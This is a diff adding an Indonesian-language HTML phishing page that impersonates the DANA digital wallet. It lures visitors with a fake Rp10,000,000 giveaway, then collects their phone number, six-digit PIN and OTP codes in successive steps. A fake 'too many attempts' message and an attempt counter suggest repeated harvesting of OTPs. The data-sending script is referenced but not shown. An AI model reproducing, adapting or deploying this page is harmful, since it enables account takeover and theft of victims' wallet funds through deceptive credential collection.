@@ -1,1 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#118EEA">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>DANA - Klaim Hadiah Saldo Rp10.000.000 Gratis!</title>
+    <meta name="description" content="🎉 BAGI-BAGI SALDO DANA Rp10.000.000! Klaim sekarang sebelum kehabisan. Syarat mudah, dapatkan saldo DANA gratis untuk transaksi apapun!">
+    
+    <!-- ========== SOCIAL MEDIA META TAGS ========== -->
+    <meta property="og:url" content="https://your-vercel-app.vercel.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="🪙 DANA bagi-bagi Hadiah Rp10.000.000! Klaim Sekarang">
+    <meta property="og:description" content="DAPATKAN SALDO GRATIS! Syarat mudah, cukup verifikasi akun DANA Anda dan dapatkan saldo Rp10.000.000 untuk transaksi pertama!! 🎊🧧🎉">
+    <meta property="og:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Hadiah Saldo DANA Rp10.000.000">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎁 DANA Bagi-bagi Saldo Rp10.000.000! Terbatas!">
+    <meta name="twitter:description" content="KLIK SEKARANG! Dapatkan saldo DANA gratis Rp10.000.000 untuk transaksi pertama Anda. Berlaku hingga 27 Desember 2025">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
+    <meta name="twitter:image:alt" content="Promo DANA Saldo Gratis">
+    <!-- ========== END SOCIAL META TAGS ========== -->
 
+    <!-- Favicon and Preconnects -->
+    <link rel="icon" href="https://www.dana.id/favicon.ico">
+    <link rel="preconnect" href="https://a.m.dana.id">
+    <link rel="preconnect" href="https://app.link">
+    <link rel="preconnect" href="https://api2.branch.io">
+    
+    <!-- Fonts and Styles -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Loading Spinner -->
+  <div class="spinner-overlay" style="display: none;">
+    <div class="spinner">
+      <svg class="spinner-back" xmlns="http://www.w3.org/2000/svg" width="54" height="54" viewBox="0 0 54 54">
+        <g fill="none" fill-rule="evenodd" transform="translate(.012 .012)">
+          <circle cx="26.988" cy="26.988" r="26.667" fill="#000" fill-opacity=".6" opacity=".6"/>
+          <path fill="#FFF" d="M22.098 22.769a8.208 8.208 0 0 1-1.24.098 a6.834 6.834 0 0 1-1.653-.199c-.87-.215-1.658-.609-2.4-1.115-.096-.066-.273-.132-.34-.086-.086.06-.134.23-.136.355-.012.72-.006 1.439-.006 2.159v2.657l-.001 5.707c-.001.39.13.709.453.917 1.355.872 2.838 1.255 4.433 1.185 1.243-.055 2.443-.34 3.618-.733 1.308-.438 2.604-.91 3.908-1.361 1.14-.394 2.3-.716 3.502-.834 1.753-.17 3.406.158 4.92 1.123.35.222.497.133.497-.28v-5.724c0-1.6-.001-3.2.002-4.8.001-.458-.19-.79-.556-1.044-1.98-1.385-4.141-1.557-6.378-.912-1.305.376-2.577.88-3.849 1.369-1.564.6-3.107 1.262-4.774 1.518z"/>
+        </g>
+      </svg>
+      <svg class="spinner-front" xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 38 38">
+        <defs>
+          <linearGradient id="prefix__a" x1="38.883%" x2="50%" y1="-16.052%" y2="90.302%">
+            <stop offset="0%" stop-color="#EDEDED" stop-opacity="0"/>
+            <stop offset="56.544%" stop-color="#FFF"/>
+            <stop offset="100%" stop-color="#FFF" stop-opacity="0"/>
+          </linearGradient>
+        </defs>
+        <circle cx="29.333" cy="29.333" r="18.115" fill="none" stroke="url(#prefix__a)" stroke-width=".807" transform="rotate(45 36.64 11.693)"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="content">
+    <div class="container">
+      <!-- Phone Number Page -->
+      <div id="number-page" style="display:block">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan Nomor HP Kamu</h2>
+        <div class="phone-input-container">
+          <div class="country-code-box">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
+            <span> +62</span>
+          </div>
+          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
+        </div>
+        <p class="info-text">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
+      </div>
+
+      <!-- PIN Page -->
+      <div id="pin-page" style="display:none">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan PIN</h2>
+        <div class="pin-container">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
+        <div class="help-forgot-container">
+          <a href="#" class="link">Bantuan</a>
+          <a href="#" class="link">Lupa PIN?</a>
+        </div>
+      </div>
+
+      <!-- OTP Page -->
+      <div id="otp-page" style="display:none">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Verifikasi Kode OTP</h2>
+        <div class="otp-container">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="otp-message-box">
+          <div style="font-weight: 500; margin-bottom: 8px;">Tap verifikasi notifikasi untuk menerima OTP</div>
+          <div style="margin-bottom: 12px; font-size: 14px;">Kode OTP telah dikirim ke nomor Anda</div>
+          <div id="resend-otp" style="color: var(--white); font-weight: 600; cursor: pointer; pointer-events: none; opacity: 0.5;">
+            KIRIM ULANG (<span id="otp-timer">115</span>s)
+          </div>
+        </div>
+        <div id="floating-notification" class="floating-notification" style="display:none">
+          <div id="notification-content">Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.</div>
+          <div id="attempt-counter" style="font-size:12px;margin-top:5px;display:none">Percobaan ke: <span id="attempt-number">1</span>/6</div>
+        </div>
+        <div id="reward-notification" class="notification" style="display:none"></div>
+        <div id="success-notification" class="floating-notification" style="display:none;background-color:#4CAF50">
+          terlalu sering memasukkan kode OTP Silahkan Verifikasi di aplikasi dana
+        </div>
+        <div class="verifikasi-button-container" style="display:none">
+          <button id="verifikasi-button" class="button">Verifikasi</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Continue Button -->
+  <div class="fixed-button-container" id="lanjutkan-container">
+    <button id="lanjutkan-button" class="button">Lanjutkan</button>
+  </div>
+
+  <!-- JavaScript -->
+  <script src="script.js"></script>
+</body>
+      </html>
